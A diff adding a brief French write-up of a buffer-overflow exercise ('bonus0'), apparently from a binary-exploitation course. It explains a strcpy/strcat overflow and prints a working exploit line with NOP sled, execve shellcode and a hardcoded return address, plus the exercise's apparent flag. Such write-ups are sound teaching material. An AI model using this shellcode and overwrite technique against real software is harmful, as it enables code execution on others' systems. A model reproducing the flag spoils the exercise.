@@ -1,0 +1,25 @@
+Le programme lis l'entree standart 2 fois et stock le contenu dans un buffer de 4096char,
+il copie maximum 20char dans un 2eme buffer de 40. 
+La 2eme copie se fait à buf2+20 donc si on entre au moins 20char pour la 1ere copie,
+les 2 chaines sont contiguës dans buf2.
+
+Il fait ensuite un strcpy de buf2 + 0 et un strcat de buf2 + 20 dans un 3eme buffer de 40.
+Comme les 2 chaines sont contiguës alors le strcpy va remplir entierement le 3eme buffer,
+ce qui va provoquer un overflow lors du strcat de buf+20 !
+	$ ./bonus0
+	-
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	-
+	BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+	AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
+	Segmentation fault (core dumped)
+
+On peut donc injecter dans un premier temps du shellcode dans le buffer de 4096,
+et ensuite overflow pour override la return address dans le main pour executer le shellcode:
+	$ (python -c 'print "A"*20 + "\x90"*200 + "\x31\xc0\x50\x68\x2f\x67\x65\x74\x68\x2f\x74\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\n"' ; sleep 0.1 ; python -c 'print "123456789" + "\xe4\xe6\xff\xbf" + "4567890\n"' ) | ./bonus0
+	 -
+	 -
+	AAAAAAAAAAAAAAAAAAAA123456789����4567890��� 123456789����4567890���
+	cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+Le sleep 0.1 permet d'attendre le 2eme read du programme.
